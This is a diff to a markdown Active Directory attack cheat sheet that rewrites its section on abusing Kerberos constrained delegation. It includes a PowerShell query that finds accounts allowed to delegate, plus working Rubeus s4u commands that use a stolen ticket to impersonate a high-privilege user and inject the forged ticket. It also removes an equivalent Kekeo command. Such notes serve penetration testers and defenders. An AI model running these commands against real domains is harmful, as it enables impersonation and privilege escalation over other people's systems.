@@ -728,9 +728,10 @@ Or using ActiveDirectory module:
 ```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```
 
 * * *
-There are three steps ```TGT -> TGS -> Delegated TGS (with victim TGT inside)``` achieved by 2 commands -
+There are three steps in this attack flow ```TGT -> TGS -> Delegated TGS (with victim TGT inside)``` achieved by Rubeus with 2 distinct commands -
+
 1) get the TGT for the SERVICE Machine/User Account
-2) Run Rubeus ```s4u``` to impersonate user of choice and assume their privileges, making sure to set the correct ```/msdsspn:``` as advertised in ```msds-allowedtodelegateto```
+2) Run Rubeus ```s4u``` to impersonate the user whose idenity we wish to steal with ```/impersonateuser:```, and making sure to set the correct ```/msdsspn:``` as advertised in ```msds-allowedtodelegateto```
 * * *
 
 #### Requesting an initial User or MachineAccount (possessing constrained delegation) TGT:
@@ -740,20 +741,13 @@ Use ```/outfile:``` or ```/nowrap``` if copy pasting -
 
 #### Using S4U and the previous TGT, request a delegated TGS by specifying the msDS-AllowedToDelegateTo Service:
 
-Kekeo:
-```
-tgs::s4u /tgt:CERT_WE_STOLE.kirbi
-/user:user_we_are_impersonating@ecorp.lab
-/service:ServiceListedIn{msDS-AllowedToDelegateTo}
-```
-* * * 
 
 #### Rubeus SFU - constrained delegation user 
 
 Rubeus (optional ```/domain``` ```/dc``` ; and ```/ptt```):
 
 ```
-Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:high_priv_user_we_want /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt
+Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:high_priv_user /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt
 ```
 
 
